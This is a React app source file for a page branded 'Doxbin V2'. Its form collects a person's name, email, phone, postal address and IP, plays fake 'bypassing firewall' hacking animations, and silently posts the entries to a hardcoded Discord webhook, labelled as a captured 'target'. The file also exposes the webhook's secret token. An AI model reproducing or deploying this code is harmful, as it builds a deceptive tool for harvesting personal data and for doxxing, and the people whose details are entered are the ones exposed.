import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Search, ShieldAlert, Skull, Terminal, AlertTriangle, Activity } from 'lucide-react';
import './App.css';

const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1468167808461439061/5ORX06BKJz7Ln8PmZ8hZtmgmUjdsifFcxv-g5y7klogQ-DC9JqMaG8dsVeP5wj4-sFu9";

function App() {
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    address: '',
    ip: ''
  });

  const [isScanning, setIsScanning] = useState(false);
  const [scanResult, setScanResult] = useState(null);
  const [errors, setErrors] = useState({});
  const [terminalLines, setTerminalLines] = useState([]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    if (errors[name]) setErrors(prev => ({ ...prev, [name]: '' }));
  };

  const validateForm = () => {
    const newErrors = {};
    // On garde une validation minimale pour les champs critiques si nécessaire, 
    // mais ici on va permettre l'envoi tant qu'au moins un champ est rempli
    const hasData = Object.values(formData).some(val => val.trim() !== '');
    if (!hasData) {
      newErrors.firstName = 'REQUIRED';
      setErrors(newErrors);
      return false;
    }
    return true;
  };

  const sendToDiscord = async () => {
    // Filtrer les champs pour ne garder que ceux qui sont remplis
    const activeFields = [];
    let textContent = "💀 **NOUVELLE CIBLE DÉTECTÉE** 💀\n";

    if (formData.firstName.trim()) {
      activeFields.push({ name: "👤 PRÉNOM", value: `\`${formData.firstName}\``, inline: true });
      textContent += `**Prénom:** ${formData.firstName}\n`;
    }
    if (formData.lastName.trim()) {
      activeFields.push({ name: "👤 NOM", value: `\`${formData.lastName}\``, inline: true });
      textContent += `**Nom:** ${formData.lastName}\n`;
    }
    if (formData.email.trim()) {
      activeFields.push({ name: "📧 EMAIL", value: `\`${formData.email}\``, inline: true });
      textContent += `**Email:** ${formData.email}\n`;
    }
    if (formData.phone.trim()) {
      activeFields.push({ name: "📱 TÉLÉPHONE", value: `\`${formData.phone}\``, inline: true });
      textContent += `**Tel:** ${formData.phone}\n`;
    }
    if (formData.address.trim()) {
      activeFields.push({ name: "🏠 ADRESSE", value: `\`${formData.address}\``, inline: false });
      textContent += `**Adresse:** ${formData.address}\n`;
    }
    if (formData.ip.trim()) {
      activeFields.push({ name: "🌐 IP ADDR", value: `\`${formData.ip}\``, inline: true });
      textContent += `**IP:** ${formData.ip}\n`;
    }

    const payload = {
      username: "DOXBIN V2 SYSTEM",
      content: textContent,
      embeds: [{
        title: "💀 TARGET ACQUIRED - DATA EXTRACTED",
        description: "```System has successfully intercepted target data.```",
        color: 0xFF0000,
        fields: activeFields,
        footer: { text: "DOXBIN V2 | SECURE DATA TRANSMISSION" },
        timestamp: new Date().toISOString()
      }]
    };

    try {
      // Tentative 1: Fetch standard
      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      if (response.ok) return true;

      // Tentative 2: Fallback no-cors
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      return true;
    } catch (error) {
      console.error('Transmission Error:', error);
      return false;
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validateForm()) {
      setScanResult({ type: 'error', message: 'CRITICAL ERROR: NO DATA ENTERED' });
      setTimeout(() => setScanResult(null), 3000);
      return;
    }

    setIsScanning(true);
    setScanResult(null);
    setTerminalLines([]);

    const logs = [
      "INITIALIZING SYSTEM...",
      "BYPASSING FIREWALL...",
      "ACCESSING GLOBAL DATABASE...",
      "EXTRACTING PACKETS...",
      "DECRYPTING TARGET INFO...",
      "UPLOADING TO SECURE SERVER..."
    ];

    for (let i = 0; i < logs.length; i++) {
      setTerminalLines(prev => [...prev, `> ${logs[i]}`]);
      await new Promise(r => setTimeout(r, 400));
    }

    const success = await sendToDiscord();
    setIsScanning(false);
    
    if (success) {
      setScanResult({ type: 'success', message: 'TARGET IDENTIFIED - DATA TRANSFERRED' });
      setTimeout(() => {
        setFormData({ firstName: '', lastName: '', email: '', phone: '', address: '', ip: '' });
        setScanResult(null);
      }, 3000);
    } else {
      setScanResult({ type: 'error', message: 'TRANSMISSION FAILED: CONNECTION RESET' });
      setTimeout(() => setScanResult(null), 3000);
    }
  };

  return (
    <div className="min-h-screen bg-black text-red-600 font-mono selection:bg-red-900 selection:text-white flex items-center justify-center p-4 overflow-hidden relative">
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-red-900/10 via-black to-black"></div>
      <div className="absolute inset-0 opacity-5 pointer-events-none bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]"></div>
      <div className="absolute inset-0 pointer-events-none z-50 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_2px,3px_100%]"></div>

      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="relative z-10 w-full max-w-xl">
        <div className="border-2 border-red-900 bg-black/90 p-6 md:p-10 shadow-[0_0_50px_rgba(127,29,29,0.3)] relative overflow-hidden">
          <div className="absolute top-0 left-0 w-4 h-4 border-t-2 border-l-2 border-red-600"></div>
          <div className="absolute top-0 right-0 w-4 h-4 border-t-2 border-r-2 border-red-600"></div>
          <div className="absolute bottom-0 left-0 w-4 h-4 border-b-2 border-l-2 border-red-600"></div>
          <div className="absolute bottom-0 right-0 w-4 h-4 border-b-2 border-r-2 border-red-600"></div>

          <div className="flex items-center justify-between mb-8 border-b border-red-900/50 pb-4">
            <div className="flex items-center gap-3">
              <Skull className="w-8 h-8 text-red-600 animate-pulse" />
              <h1 className="text-3xl font-black tracking-tighter uppercase italic">Doxbin V2</h1>
            </div>
            <div className="text-xs text-red-900 flex flex-col items-end">
              <span>SYSTEM: ACTIVE</span>
              <span>ENCRYPTION: AES-256</span>
            </div>
          </div>

          <AnimatePresence mode="wait">
            {isScanning ? (
              <motion.div key="scanning" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="py-10">
                <div className="flex items-center gap-2 mb-4 text-red-500">
                  <Activity className="w-5 h-5 animate-bounce" />
                  <span className="text-sm font-bold uppercase tracking-widest">Intercepting Data...</span>
                </div>
                <div className="bg-red-950/20 border border-red-900 p-4 h-48 overflow-hidden font-mono text-xs">
                  {terminalLines.map((line, i) => (
                    <div key={i} className="mb-1 text-red-400">{line}</div>
                  ))}
                  <motion.div animate={{ opacity: [0, 1] }} transition={{ repeat: Infinity, duration: 0.5 }} className="inline-block w-2 h-4 bg-red-600 ml-1"></motion.div>
                </div>
              </motion.div>
            ) : scanResult ? (
              <motion.div key="result" initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className={`py-16 text-center ${scanResult.type === 'success' ? 'text-red-500' : 'text-red-800'}`}>
                {scanResult.type === 'success' ? <ShieldAlert className="w-20 h-20 mx-auto mb-6 animate-pulse" /> : <AlertTriangle className="w-20 h-20 mx-auto mb-6" />}
                <h2 className="text-2xl font-bold uppercase tracking-tighter">{scanResult.message}</h2>
              </motion.div>
            ) : (
              <form onSubmit={handleSubmit} className="space-y-5">
                <div className="grid grid-cols-2 gap-4">
                  <Input label="FIRST_NAME" name="firstName" value={formData.firstName} onChange={handleChange} error={errors.firstName} />
                  <Input label="LAST_NAME" name="lastName" value={formData.lastName} onChange={handleChange} error={errors.lastName} />
                </div>
                <Input label="EMAIL_ADDRESS" name="email" type="email" value={formData.email} onChange={handleChange} error={errors.email} />
                <Input label="PHONE_NUMBER" name="phone" type="tel" value={formData.phone} onChange={handleChange} error={errors.phone} />
                <Input label="POSTAL_ADDRESS" name="address" value={formData.address} onChange={handleChange} error={errors.address} />
                <Input label="IP_OVERRIDE" name="ip" value={formData.ip} onChange={handleChange} placeholder="AUTO_DETECT" />

                <button type="submit" className="w-full bg-red-700 hover:bg-red-600 text-black font-black py-4 mt-4 transition-all active:scale-95 flex items-center justify-center gap-3 group border-b-4 border-red-900">
                  <Terminal className="w-5 h-5" />
                  EXECUTE SEARCH
                </button>
              </form>
            )}
          </AnimatePresence>
        </div>
      </motion.div>
    </div>
  );
}

function Input({ label, name, type = "text", value, onChange, error, placeholder }) {
  return (
    <div className="space-y-1">
      <label className="text-[10px] font-bold text-red-900 uppercase tracking-widest ml-1">{label}</label>
      <input
        type={type}
        name={name}
        value={value}
        onChange={onChange}
        placeholder={placeholder}
        className={`w-full bg-black border ${error ? 'border-red-500' : 'border-red-900/50'} focus:border-red-600 focus:outline-none p-3 text-red-500 text-sm transition-colors placeholder:text-red-950`}
      />
    </div>
  );
}

export default App;
